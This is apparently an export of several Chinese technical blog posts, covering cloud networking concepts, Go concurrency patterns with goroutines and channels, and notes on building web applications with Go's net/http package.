Namespace虚拟出的沙盒网络环境，包含容器的整个网络协议栈 Endpoint：网络端点，用来连接Sandbox到Network。 Network：一系列可以相互通信的Endpoint所组成的虚拟网络。 CNI：容器网络接口，更加通用，为了使得不同容器平台通过统一的接口互联互通。\n两个组件：\n容器管理系统 网络插件 两个接口：\n添加ADD 删除DELETE 运行流程：\n容器运行环境给每个容器分配Network Namespace和容器ID，然后把这些消息连同CNI的配置参数传递给网络驱动。 网络驱动会以JSON文件的形式返回分配给该容器的IP地址并把该容器连接到网络。 kubernetes网络技术 组网模型\nk8s是主从架构的Docker集群编排器，架构如下。\nMaster：控制整个k8s集群所有节点的计算机，用于控制集群中的所有Node和Pod。 Node：k8s集群中的一个节点，是实际上负责提供服务的主机。 Pod：提供一项服务所需的一系列密切相关的容器的集合（如应用容器和存储容器）。是k8s中可部署的最小单位，每个Pod的IP地址唯一。 Service：k8s集群中一组提供相同服务的Pod以及访问这些Pod的方式，还提供了外部访问这些Pod的接口。 Label和Label Selector：Label是存储在etcd的一个k-v键值对，根据需要给Pod、Node以及Service等对象添加一个或多个Label，并通过Label Selector选择完成业务所需要的对象。 容器网络的管理\nk8s集群需要把Service Cluster分为前后端两组，面向用户仅提供前端服务器的虚拟IP和虚拟端口号，前端服务器处理后最终指派物理后端服务器。\n4. 网络虚拟化技术 4.1 概述 数据中心网络的大二层的不同用户的数据帧的传输会带来巨大的风险。这些问题可以用网络虚拟化和隧道技术解决。\n网络虚拟化：把物理网络虚拟化成多个逻辑网络，通常使用VLAN Tag等方式区分数据流，使用隧道技术进行透明传输。这样可以对某个网络进行单独管理，高效利用资源。 4.2 传统网络隧道技术 VLAN：VLAN技术通过给每个租户分配一个VLAN ID创建虚拟的二层网络，缺点是数量有线，只支持4096个，无法满足实际需求。因此业界推出VXLAN虚拟可扩展局域网。 Q-in-Q：也叫Stacked VLAN或者Double VLAN，主要思想是VLAN Tag堆叠，实现透明转发。 MPLS：多协议标签交换。解决的问题是大流量下基于最长前缀匹配规则的路由转发开销大，性能不可接受。这是一种基于标签的转发技术，通过在报文中添加MPLS标签，实现高效的数据转发和数据分层的精细控制。 GRE： 目标是对某些网络层协议进行封装，然后创建隧道使得这些报文可以在另一个网络层协议中传输，解决不同网络层协议报文的传输问题。 4.3 VXLAN 这是一种大二层网络的虚拟化技术，采用UDP进行封装。优点如下：\n低成本的实现跨三层的大二层网络，通过隧道技术实现了三层网络上的逻辑大二层网络 有充足的ID数量（1600万） 租户隔离，实现IP地址，MAC地址复用 可感知虚拟机 支持细粒度的负载均衡 4.4 VPC技术 虚拟私有云VPC为租户提供隔离的环境，租户在使用网络时，可以自定义选择IP地址的范围、创建子网和配置路由表和网关，并且无需担心和其他用户产生冲突。\n5. 软件定义网络技术SDN 传统的网络架构适应性和更新能力不足。软件定义网络SDN技术的可编程性使得网络变化更加灵活。通过将数据平面和控制平面进行划分，实现网络灵活调配。数据平面上可以使用通用的网络设备提供编程能力，控制平面上对网络进行统一管理。\n简单说，思想就是解耦控制平面与数据平面，将处理网络硬件的处理细节交给人。\n5.1 体系结构 自顶向下：\n应用平面：如流量均衡模块和防火墙等网络应用模块。允许用户通过编程实现网络行为。 北向接口：SDN控制器提供给上层应用的接口，使得上层应用可以调用控制器的功能。 控制平面：包含各类控制器，是SDN的数据中心，负责网络内部路径交换和边界路由的生成。控制器实例可以部署在不同位置，通过南向接口对数据平面中的网络设备进行集中式管理，如下发转发决策、监测网络状态。同时通过北向接口向应用平面提供服务。 南向接口：SND用于管理交换机的接口，如OpenFlow协议，是数据平面和控制平面的交互接口。 数据平面：支持各类SDN的网络设备，如路由器、交换机、虚拟交换机和无线访问接入点等，主要负责用户数据转发，也可以上报网络资源和状态信息。 5.2 数据平面和控制平面分离 SDN实现核心思想就是解耦数据平面和控制平面，以转发表为界。数据平面中网络设备只保存转发信息，并且有高速转发能力，所有网络决策都由控制器来完成。控制平面可以获取全局网络信息和状态，并且通过南向接口将编程指令下发到数据平面。\n这样也带来一些问题：\n单控制节点的单点故障；多控制节点的资源调度，负载均衡 一致性问题 高可用性 6. 网络功能虚拟化技术NFV 常见的网络功能有防火墙、入侵检测系统、负载均衡器、网络地址转换等。传统的网络部署中，网络的功能实现主要依赖于硬件设备。虚拟化技术使得网络功能的部署不再依赖硬件，而通过软件的形式灵活部署在通用服务器的虚拟化资源中，可以在一个物理平台上同时运行多个不同的网络功能程序。\n优势：\n共享硬件资源，降低网络成本 部署灵活可伸缩，弹性和高可重用 自动化更新升级 多租户和安全隔离 负载均衡和能耗控制 接口标准化 云计算网络安全基础\n云计算网络安全技术\n云计算网络安全机制\n云计算网络安全实践\n","date":"2021-11-01T17:37:21+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BA%91%E8%AE%A1%E7%AE%97%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%AE%89%E5%85%A8%E7%AE%80%E8%AE%B0/","title":"《云计算网络与安全》简记"},{"content":"goroutine和channel 在golang中，使用goroutine创建轻量级线程（协程），用来独立执行任务，实现并发操作。使用goroutine和channel实现编程是go的一种特有的并发模式，叫做CSP(Communicating Sequential Process)模式。实现并发的关键点是处理多任务之间的通信，在OS中我们知道，例如：管道、共享内存、消息队列等都是常见的进程通信方法。CSP模式中，使用管道channel完成不同goroutine之间的通信。\n注意点 使用go routine的地方往往需要保持程序持续运行，写代码时容易忘记for的使用 关于父子协程(main除外)没有直接的控制关系，也就是说父协程kill掉后，子协程依旧可以继续执行；但是main停到后所有的子协程都会被kill掉 golang在select-case中，若没有default同时没有一个case可以执行，那么该select将会阻塞，直到有某一个case执行 并发编程 通常来讲，golang并发编程三要素有：\n生成器 服务/任务 此外，还要有合适的接收多任务结果的方法。\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) // 生成器，用来创建独立运行的goroutine func gen(name string) chan string { c := make(chan string) go func() { // 任务name: // 使用管道 c 做一些任务，并返回 c 以便其他任务使用 // 对于并发执行的任务，会有异步性和不确定性 // 每一个任务产生结果的时间是不同的 for { } }() return c } // 第1种接收多任务结果的方法： // 该方法适用于不知道需要多少任务的情况 // 中心思想： // 1）创建一个公用管道，用于接收所有任务的数据 // 2）为每一个任务都生成一个 goroutine ，每个goroutine只负责收集自己的结果，放入公用管道中 // 3）公用管道中有所有任务的处理结果，将公用管道返回，拿到所有任务的结果 func fanIn(chs ...chan string) chan string { c := make(chan string) for _, ch := range chs { go func(in chan string) { for { c \u0026lt;- \u0026lt;-in } }(ch)\t// 由于golang值传递的特性，避免丢失参数，必须将拷贝值传入 } return c } // 第2中接收多任务结果的方法： // 适用于知道多少个任务的情况 // 中心思想： // 1）创建一个公用管道，用于接收所有任务的数据 // 2）只用一个 goroutine ，通过 for + select 选择已经准备好数据的任务 // 3）由于任务并发执行的异步性、不确定性，for每次只会选择一个任务去接收数据 // 4）公用管道中有所有任务的处理结果，将公用管道返回，拿到所有任务的结果 func fanInBySelect(c1, c2 chan string) chan string { c := make(chan string) go func() { for { select { case m := \u0026lt;-c1: c \u0026lt;- m case m := \u0026lt;-c2: c \u0026lt;- m } } }() return c } func main() { // 创建两个任务，分别用1个channel进行通信 m1, m2 := gen(\u0026#34;m1\u0026#34;), gen(\u0026#34;m2\u0026#34;) //c := fanIn(m1, m2) c := fanInBySelect(m1, m2) fmt.Println(\u0026lt;-c) } 并发编程-Demo package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) /* - 任务生成器 - 接收任务名字 - 返回一个channel */ func WorkerGen(name string) chan string { workChan := make(chan string) // 启一个 go routine 不定期发送消息 go func() { for { // 随机睡眠 1ms - 100ms time.Sleep(time.Millisecond * time.Duration(rand.Intn(100))) message := name + \u0026#34; send a message.\u0026#34; /* - 当message没有被取出时，该 goroutine会被阻塞 - 但是不影响 父 协程执行 */ workChan \u0026lt;- message } }() return workChan } /* - 方法一 - 适用于不知道并发任务数量的情况 - 通过便利来处理管道 */ func WorkerDealUnknownNum(workers ...chan string) { // 创建公用管道 commenChan := make(chan string) for _, workChan := range workers { /* - 这里对每个 workchan 都开一个 goroutine - 防止某个 worker 被阻塞，导致整个程序都不能正常执行，避免死锁 */ go func(inChan chan string) { for { // 需要不停的放数据 msg := \u0026lt;-inChan commenChan \u0026lt;- msg } }(workChan) // 必须显示的传入所调用的任务的工作管道 } // 再开一个 goroutine 保持从 commonChannel 中拿数据 go func() { for {\t// 需要不停的拿数据 tempMsg := \u0026lt;-commenChan fmt.Println(tempMsg) } }() } /* - 方法二 - 适用于已知任务数量的情况 - 使用 select 对任务进行选择 - 这里假设三个 */ func WorkerDealKnownNum(worker0, worker1, worker2 chan string) { // 创建公用管道 commonchan := make(chan string) // 起一个 goroutine 保持对worker的判断 go func() { for { // 每次循环只拿一个管道的信息 select { case msg := \u0026lt;- worker0: commonchan \u0026lt;- msg case msg := \u0026lt;- worker1: commonchan \u0026lt;- msg case msg := \u0026lt;- worker2: commonchan \u0026lt;- msg } } }() // 起一个 goroutine 保持输出 go func() { for { msg := \u0026lt;- commonchan fmt.Println(msg) } }() } func main() { worker0 := WorkerGen(\u0026#34;work0\u0026#34;) worker1 := WorkerGen(\u0026#34;work1\u0026#34;) worker2 := WorkerGen(\u0026#34;work2\u0026#34;) // WorkerDealUnknownNum(worker0, worker1, worker2) WorkerDealKnownNum(worker0, worker1, worker2) // 停留 5s 看输出 time.Sleep(time.Second * 5) } 任务控制 常用的并发任务控制有这几种方法：\n非阻塞等待 超时机制 任务中断退出 使用sync.WaitGroup 非阻塞等待 使用case-default实现，如果此时没有准备好数据，就走default做别的任务。\nfunc nonBlockingWait(c chan string) (string, bool) { select { case m := \u0026lt;-c: return m, true default: return \u0026#34;\u0026#34;, false } } 超时机制 给定一个timeout，在select中，若规定的timeout内没有消息，则time.After会向管道发送数据，表示规定时间已到，时间超过，就去做别的事情。\nfunc timeoutWait(c chan string, timeout time.Duration) (string, bool) { select { case m := \u0026lt;-c: return m, true case \u0026lt;-time.After(timeout): return \u0026#34;\u0026#34;, false } } 任务中断退出 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) // 使用channel，让主进程和goroutine之间通知任务结束 func msgGen(name string, done chan struct{}) chan string { c := make(chan string) go func() { i := 0 for { select { case \u0026lt;-time.After(time.Duration(rand.Intn(5000)) * time.Millisecond): c \u0026lt;- fmt.Sprintf(\u0026#34;service %s: message %d\u0026#34;, name, i) case \u0026lt;-done:\t// goroutine 中得到通知，任务结束 fmt.Println(\u0026#34;cleaning up\u0026#34;) time.Sleep(2*time.Second) fmt.Println(\u0026#34;cleanup done\u0026#34;) done\u0026lt;- struct{}{}\t// 清理任务后，具备结束条件，告知主进程，然后结束 return } i++ } }() return c } func main() { done := make(chan struct{}) m1 := msgGen(\u0026#34;server1\u0026#34;, done) for i := 0; i \u0026lt; 5; i++ { if m, ok := timeoutWait(m1, time.Duration(rand.Intn(2000))*time.Millisecond); ok { fmt.Println(m) } else { // fmt.Println(\u0026#34;no message from service2\u0026#34;) fmt.Println(\u0026#34;service1 timeout\u0026#34;) } } done \u0026lt;- struct{}{}\t// 主进程向 done 管道通知，结束 \u0026lt;-done\t// 收到 goroutine 结束的消息，然后结束 time.Sleep(time.Second) } sync.WaitGroup // 使用背景：combine 需要等 4 个任务都完成之后 才可以处理返回值 // 使用 sync.WaitGroup 来等待任务完成 func combine(r image.Rectangle, c1, c2, c3, c4 \u0026lt;-chan image.Image) \u0026lt;-chan string { c := make(chan string) go func() { // 使用 waitgroup 是因为： // 开了 goroutine 后 goroutine 的生命周期 就不受这个函数的影响了 // 如果 goroutine 还没有执行完这个函数就结束了 // 这个函数。自然拿不到 goroutine 的结果，也就无法完成任务 var wg sync.WaitGroup newImage := image.NewNRGBA(r) // 复制块 copy := func(dst draw.Image, r image.Rectangle, src image.Image, sp image.Point, index string) { draw.Draw(dst, r, src, sp, draw.Src) // 记得释放一个 mutex wg.Done() // 匿名函数 使用外面的 变量 } wg.Add(4) var s1, s2, s3, s4 image.Image var ok1, ok2, ok3, ok4 bool // 使用循环做，保证 4 个任务都完成 for { select { case s1, ok1 = \u0026lt;-c1: go copy(newImage, s1.Bounds(), s1, image.Point{r.Min.X, r.Min.Y}, \u0026#34;1\u0026#34;) case s2, ok2 = \u0026lt;-c2: go copy(newImage, s2.Bounds(), s2, image.Point{r.Max.X / 2, r.Min.Y}, \u0026#34;2\u0026#34;) case s3, ok3 = \u0026lt;-c3: go copy(newImage, s3.Bounds(), s3, image.Point{r.Min.X, r.Max.Y / 2}, \u0026#34;3\u0026#34;) case s4, ok4 = \u0026lt;-c4: go copy(newImage, s4.Bounds(), s4, image.Point{r.Max.X / 2, r.Max.Y / 2}, \u0026#34;4\u0026#34;) } // 结束条件 if ok1 \u0026amp;\u0026amp; ok2 \u0026amp;\u0026amp; ok3 \u0026amp;\u0026amp; ok4 { break } } // 先阻塞 保证goroutine运行完 wg.Wait() buf2 := new(bytes.Buffer) jpeg.Encode(buf2, newImage, nil) c \u0026lt;- base64.StdEncoding.EncodeToString(buf2.Bytes()) }() return c } 任务控制-Demo 以：超时机制、任务中断退出两种情况为例\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) /** * msgGen * @Description: 消息生成器 * @param name: 用来标识发送消息的实体 * @param done: 传递从调度程序来的结束消息 * @return chan: 将自己的消息通过chan传递出去 **/ func msgGen(name string, done chan struct{}) chan string { c := make(chan string) go func() { i := 0 for { select { // time.After函数在到达规定时间后，返回一个 \u0026lt;-chan 类型的管道 case \u0026lt;-time.After(time.Duration(rand.Intn(3000)) * time.Millisecond): // 随机的发送消息 c \u0026lt;- fmt.Sprintf(\u0026#34;service %s: message %d\u0026#34;, name, i) // 如果结束通知到来，结束，并通知主协程 自己已经结束了 case \u0026lt;-done: fmt.Println(\u0026#34;cleaning up\u0026#34;) time.Sleep(2 * time.Second) fmt.Println(\u0026#34;cleanup done\u0026#34;) done \u0026lt;- struct{}{} return } i++ } }() return c } /** * msgGenTimeout * @Description:\t该消息生成器一旦生成消息超时，自动done掉 * @param name:\t服务名标识 * @return chan:\t通过管道传出消息 **/ func msgGenTimeout(name string) chan string { c := make(chan string) go func() { i := 0 for { // 如果没有触发超时，就一直发送数据 select { // 每轮消息 10ms 内随机发送 case \u0026lt;-time.After(time.Duration(rand.Intn(10)) * time.Millisecond): c \u0026lt;- fmt.Sprintf(\u0026#34;service %s: send message %d\u0026#34;, name, i) // 超时计数在每轮的 100ms 内随机超时 case \u0026lt;-time.After(time.Duration(rand.Intn(100)) * time.Millisecond): c \u0026lt;- fmt.Sprintf(\u0026#34;%s timeout\u0026#34;, name) return // 超时自动退出 } i++ } }() return c } /** * timeoutWait * @Description: 模拟超时 * @param c: 查看管道 c 中是否有消息 * @param timeout: 超时时间 * @return string: 返回消息或者空 * @return bool: 超时标志 **/ func timeoutWait(c chan string, timeout time.Duration) (string, bool) { select { case m := \u0026lt;-c: return m, true case \u0026lt;-time.After(timeout): return \u0026#34;\u0026#34;, false } } /** * timeoutMechanism * @Description: 并发任务控制 -- 超时自动退出 *\t假设有n=3个协程，如果其中某个协程规定时间内没有发出消息，则退出并通知主协程 **/ func timeoutMechanism() { m1 := msgGenTimeout(\u0026#34;service1\u0026#34;) m2 := msgGenTimeout(\u0026#34;service2\u0026#34;) m3 := msgGenTimeout(\u0026#34;service3\u0026#34;) i := 0 // 用来计数有几个协程timeout for { if i == 3 { break } select { case msg := \u0026lt;-m1: if strings.Contains(msg, \u0026#34;timeout\u0026#34;) { // 超时消息 fmt.Println(msg,\u0026#34;===================\u0026#34;) i++ } else { fmt.Println(msg) } case msg := \u0026lt;-m2: if strings.Contains(msg, \u0026#34;timeout\u0026#34;) { fmt.Println(msg,\u0026#34;===================\u0026#34;) i++ } else { fmt.Println(msg) } case msg := \u0026lt;-m3: if strings.Contains(msg, \u0026#34;timeout\u0026#34;) { fmt.Println(msg,\u0026#34;===================\u0026#34;) i++ } else { fmt.Println(msg) } } } } /** * notifyToExit * @Description: 并发任务控制 -- 主进程通过 channel 通知子协程退出 **/ func notifyToExit() { done := make(chan struct{}) m1 := msgGen(\u0026#34;server1\u0026#34;, done) for i := 0; i \u0026lt; 5; i++ { if m, ok := timeoutWait(m1, time.Duration(rand.Intn(2000))*time.Millisecond); ok { // 如果 msgGen 有消息产生，就打印出来 // 每轮消息在 5000ms 内随机产生 --- 每轮超时的时间在 2000ms 内 fmt.Println(m) } else { // fmt.Println(\u0026#34;no message from service2\u0026#34;) fmt.Println(\u0026#34;service1 timeout\u0026#34;) } } // 主进程通知子协程中断退出 done \u0026lt;- struct{}{} // 子协程退出后通知父协程 \u0026lt;-done time.Sleep(time.Second) } func main() { //timeoutMechanism()\t// 超时自动退出 notifyToExit()\t// 主进程通知结束 } ","date":"2021-10-16T16:26:45+08:00","permalink":"https://lizonglingo.github.io/p/go%E7%9A%84%E5%B9%B6%E5%8F%91%E4%B8%8E%E4%BB%BB%E5%8A%A1%E6%8E%A7%E5%88%B6/","title":"Go的并发与任务控制"},{"content":" 这本书主要讲了使用golang原生的net/http包开发Web应用，后面也强调了使用goroutine和channel实现并发处理，提高Web应用的性能。是一本比较系统的介绍Go Web开发的书。\n本文按照全书行进章节进行一些要点的记录。\n1. Go与Web应用 大规模可扩展的Web应用应具备以下特质： 可扩展：垂直扩展（提升单台设备的CPU数量和性能）、水平扩展（增加计算机的数量提高性能），go的并发编程的特点让其在垂直扩展上有优势。 模块化：接口实现动态类型匹配、函数闭包等，有助于模块化设计；go常用于构建微服务。 可维护：语法简洁可读，工具链如gotest较完备。 高性能：编译型静态代码，速度快于解释型语言，并发编程也有利于高性能。 Web工作的原理：主要理解服务器与客户端的通信原理，包括HTTP、TCP/IP等协议。这里要注意，HTTP是无状态的，所以引出后面cookie和session的使用，来保存用户状态。 HTTP请求：要熟悉请求报文，如请求头、首部、报文主体。 请求方法：GET、POST、DELETE、HEAD、PUT等，在关于Restful API构建是，这些方法是要对应不同的服务。 安全请求方法：如Get、HEAD不会对服务器的状态进行修改，是安全的；而POST、PUT、DELETE会对服务器状态修改，这些方法都是不安全的。 幂等请求方法：就是一个HTTP方法使用相同数据进行二次调用时，不会对服务器的状态造成任何改变，那这个方法就是幂等的。所有安全请求方法都是幂等的，PUT和DELETE也是幂等的。 HTTP请求首部：记录了与请求本身及客户端有关的信息，许多字段如Accept、Cookie、Content-Length、Content-Type、User-Agent等，这些都是需要熟悉的。 HTTP响应：是对HTTP请求报文的响应，报文包括状态行、零个和任意响应首部、可选报文主体。 响应状态码：在状态行中，有1XX、2XX、3XX、4XX、5XX五类，有不同的含义。开发中，对请求的正常或者异常的响应都有状态码是一个很好的习惯。 响应首部：如Content-Length、Content-Type、Set-Cookie等。 HTTP/2：HTTP/1是纯文本方式、HTTP/2是二进制协议，语法分析更为高效，协议更加紧凑和健壮。HTTP 1.X一次只能发单个请求，而HTTP 2是完全多路复用的，多个请求和响应可以在同一时间内使用同一个连接，有效的提高性能。 Web应用通过HTTP协议，以HTTP请求报文的形式获取客户端输入-\u0026gt;对请求报文进行处理后执行必要的操作-\u0026gt;生成HTML以HTTP响应报文的形式返回给客户端。为了完成这些任务，Web应用可以被分为处理器Handler和模板引擎Template Engine两部分。 处理器：处理器接收请求，处理，调用模板引擎填充数据。在MVC模式看来处理器既是controller又是model。 模板引擎：接收处理器的数据，渲染成HTML返回给客户端。有静态模板和动态模板两种，静态模板用占位符替换成相应的数据生成HTML，动态模板除了使用占位符，还有编程语句结构，如条件语句、迭代、变量之类的。 Go的net/http net/http标准库可以分为客户端和服务器两部分，有的结构和函数只支持客户端和服务器中的一个，有的则同时支持客户端和服务器。\n一般的有两种方式配置Web服务器：\n// 方式一 http.ListenAndServe(\u0026#34;\u0026#34;, nil) // 方式二 更详细的配置服务器 server := http.Server{ Addr: \u0026#34;127.0.0.1:8080\u0026#34;, Handler: nil,\t// 使用的处理器 ReadTimeout:\t... ... } server.ListenAndServe() 关于HTTPS 使用HTTPS需要证书和密钥：\nserver.ListenAndServeTLS(\u0026#34;cert.pem\u0026#34;, \u0026#34;key.pem\u0026#34;) 其中，cert.pem是SSL证书，key.pem是服务器的私钥。实际的生产环境中使用SSL证书需要通过VeriSign、Thawte等一些CA取得。通过Go的crypto包可以生成证书。\n2. 一个通用的Web应用 一个通用的Web应用从设计开始，包括下面一些方面：\n使用多路复用器配置处理器、处理器函数 数据模型，包括数据结构、存储等 静态文件如HTML、CSS 使用cookie和session进行访问控制 使用模板生成HTML响应 使用Cookie进行访问控制 用户登录成功身份经过验证后，服务器会在成功的登录请求的响应的首部中写入一个cookie，客户端在接收这个cookie后将它写入存储到浏览器中。Go中的http.Cookie用来构建cookie。核实用户身份后，程序在后端创建一个session，存储到数据库中，session结构中的uuid字段作为cookie的值，返回给客户端存储在浏览器里，之后生命周期里浏览器的请求会带着cookie，完成访问控制。\n对于cookie的生命周期一般有两类：\n会话cookie：不设置特定的过期时间，在浏览器关闭后自动移除失效。\n通过设置过期时间的cookie：比如5min后过期。\ncookie := http.Cookie{ Name:\t\u0026#34;_cookie\u0026#34;, Value:\tsession.Uuid, HttpOnly:\ttrue, } http.SetCookie(writer, \u0026amp;cookie)\t// 写到响应首部 HttpOnly字段表示该cookie只能通过HTTP/HTTPS访问，无法通过JavaScript等非HTTP API访问。\n在后续客户端发来请求后，服务器从Request中拿到cookie的value，也就是存储在数据库中session对象的Uuid，进行比对，进而识别请求的客户端身份是否合法。\n// 拿到cookie进行访问控制处理 cookie := r.Cookie(\u0026#34;_cookie\u0026#34;) sess = data.Session{Uuid: cookie.Value} ok := sess.Check() if ok { ... } 3. 使用处理器和处理器函数接收请求 处理器和处理器函数 处理器 Go中，一个处理器就是一个拥有ServeHTTP(http.ResponWriter, *http.Request)方法的接口。而多路复用器DefaultServerMux是ServeMux的一个实例，后者也实现了ServeHTTP方法。DefaultServerMux既是ServeMux的实例，也是Handler结构的实例，它不仅是一个多路复用器还是一个处理器。它要做的事情就是根据请求的URL重定向到不同的处理器上。\n当然，我们也可以编写自己的处理器去代替默认的DefaultServerMux。更多的时候，我们会使用多个处理器去处理指定的URL，所以常常使用服务器默认的DefaultServerMux做多路复用器，将不同的处理器使用http.Handle绑定到DefaultServerMux。http.Handle实际上是ServeMux结构的方法：\n// 定义一个处理器 type HelloHandler struct{} // 实现 ServeHTTP 接口 func (h *HelloHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { ... } // http.Handle 也做多路复用器的用途 http.Handle(\u0026#34;/hello\u0026#34;, \u0026amp;hello)\t// 传入一个处理器处理来自 /hello 的路由 处理器函数 处理器函数是与处理器拥有相同行为的函数，与ServeHTTP有相同的签名。\nfunc hello(w http.ResponseWriter, r *http.Request) { ... } http.HandleFunc(\u0026#34;/hello\u0026#34;, hello) 实际上，Go的HandlerFunc函数类型，把一个处理器函数隐式的转换成一个处理器。\n// 源码 // 将处理器函数给默认的多路复用处理器 func HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { DefaultServeMux.HandleFunc(pattern, handler) } // 调用 多路复用处理器的 HandleFunc 对路由绑定处理器 func (mux *ServeMux) HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { if handler == nil { panic(\u0026#34;http: nil handler\u0026#34;) } mux.Handle(pattern, HandlerFunc(handler)) } // mux.Handle(pattern, HandlerFunc(handler)) 里面的 HandlerFunc() 实现了 ServeHTTP type HandlerFunc func(ResponseWriter, *Request) // ServeHTTP calls f(w, r). func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) { f(w, r) } 串联多个处理器和处理器函数 常见的Web在真正处理数据时，往往需要做一些其他工作，如：日志记录、安全检查、错误处理等。有些时候需要在处理业务的处理器前面串联上其他的处理器，又叫做管道处理。得益于Go的匿名函数、闭包这些特性，可以很好的将处理器串联起来。\n串联多个处理器函数 // 串联多个处理器函数 func hello(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello\u0026#34;) } // 在处理hello前串联一个记录日志的处理器 func log(h http.HandlerFunc) http.HandlerFunc { return func (w http.ResponseWriter, r *http.Request) { // 处理日志 ... h(w, r) } } // 在处理日志之前再串联一个验证用户身份的处理器 func authentication(h http.HandlerFunc) http.HandlerFunc { return func (w http.ResponseWriter, r *http.Request) { // 鉴权 ... h(w, r) } } // main func main() { ... http.HandleFunc(\u0026#34;/hello\u0026#34;, authentication(log(hello))) ... } 串联处理器 type HelloHandler struct{} func (h HelloHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello!\u0026#34;) } func log(h http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Printf(\u0026#34;Handler called - %T\\n\u0026#34;, h) // 处理器直接显示调用ServeHTTP h.ServeHTTP(w, r) }) } func authentication(h http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Println(\u0026#34;Do some protect...\u0026#34;) h.ServeHTTP(w, r) }) } func main() { ... http.Handle(\u0026#34;/hello\u0026#34;, authentication(log(hello))) ... } 与串联处理器函数不同的是，串联处理器需要将匿名函数返回的函数显式的使用http.HandlerFunc转换成http.Handler。在main中使用的也是http.Handle()而不是http.HandleFunc()了。\nServeMux和DefaultServeMux ServeMux将URL映射到响应的处理器。它也实现了ServeHTTP方法。\n而DefaultServeMux是ServeMux的一个实例。开发中没有指定处理器是，Go的服务器就会用它作为默认实例。\n最小惊讶原则 从上图，假设有：\nhttp.Handle(\u0026#34;/hello\u0026#34;, \u0026amp;helloHandler) 请求的URL为/hello，多路复用器会分发到helloHandler处理，若为/hello/other呢？\n答案也是一样：helloHandler。就类似于最长前缀匹配规则。\n但是，如果改成：\nhttp.Handle(\u0026#34;/hello/\u0026#34;, \u0026amp;helloHandler) 匹配的路由后面也有/，那么只会与完全相同的/hello/匹配，而/hello/other就会匹配不到，返回错误。\n其他的处理器 除net/http包外，还有如HttpRouter实现的服务器，可以使用变量实现URL模式匹配，有更多丰富的功能。\n4. 请求的处理和响应 请求和响应 Request结构 type Request struct { Method string URL *url.URL Header Header Body io.ReadCloser GetBody func() (io.ReadCloser, error)\t// 实例化时通过匿名函数实现 GetBody ContentLength int64 TransferEncoding []string Close bool Host string Form url.Values PostForm url.Values MultipartForm *multipart.Form TLS *tls.ConnectionState Response *Response ctx context.Context ... } URL结构 type URL struct { Scheme string Opaque string // encoded opaque data User *Userinfo // username and password information Host string // host or host:port Path string // path (relative paths may omit leading slash) RawPath string // encoded path hint (see EscapedPath method) ForceQuery bool // append a query (\u0026#39;?\u0026#39;) even if RawQuery is empty RawQuery string // encoded query values, without \u0026#39;?\u0026#39; Fragment string // fragment for references, without \u0026#39;#\u0026#39; RawFragment string // encoded fragment hint (see EscapedFragment method) } 请求首部 一个请求的Demo：\nGET / HTTP/1.1 Host: hackr.jp User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8 Accept-Language: ja,en-us;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: keep-alive If-Modified-Since: Fri, 31 Aug 2007 02:02:20 GMT If-None-Match: \u0026#34;45bae1-16a-46d776ac\u0026#34; Cache-Control: max-age=0 Go拿到的是这样的：\n// http.Request \u0026amp;{GET /body HTTP/1.1 1 1 map[Accept:[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9] Accept-Encoding:[gzip, deflate, br] Accept-Language:[zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6] Cache-Control:[max-age=0] Connection:[keep-alive] Cookie:[csrftoken=AFpbq4QNxdr35oU4SgESrmHLGtgbjLIUrDIkod4ZjsQIq1hynjiMRYphYluqomNE] Sec-Ch-Ua:[\u0026#34;Chromium\u0026#34;;v=\u0026#34;94\u0026#34;, \u0026#34;Microsoft Edge\u0026#34;;v=\u0026#34;94\u0026#34;, \u0026#34;;Not A Brand\u0026#34;;v=\u0026#34;99\u0026#34;] Sec-Ch-Ua-Mobile:[?0] Sec-Ch-Ua-Platform:[\u0026#34;Windows\u0026#34;] Sec-Fetch-Dest:[document] Sec-Fetch-Mode:[navigate] Sec-Fetch-Site:[none] Sec-Fetch-User:[?1] Upgrade-Insecure-Requests:[1] User-Agent:[Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47]] {} \u0026lt;nil\u0026gt; 0 [] false 127.0.0.1:8080 map[] map[] \u0026lt;nil\u0026gt; map[] 127.0.0.1:64798 /body \u0026lt;nil\u0026gt; \u0026lt;nil\u0026gt; \u0026lt;nil\u0026gt; 0xc0000f42c0} 请求体是一个map结构的数据，比如：\nmap[ Accept:[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9] Accept-Encoding:[gzip, deflate, br] Accept-Language:[zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6] Cache-Control:[max-age=0] Connection:[keep-alive] Cookie:[csrftoken=AFpbq4uy3rn35oU4SkESrmHLGwvqjLIjuDIkod4ZjsQIq1uknHiMRYphYluqomNE] .... Upgrade-Insecure-Requests:[1] User-Agent:[Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 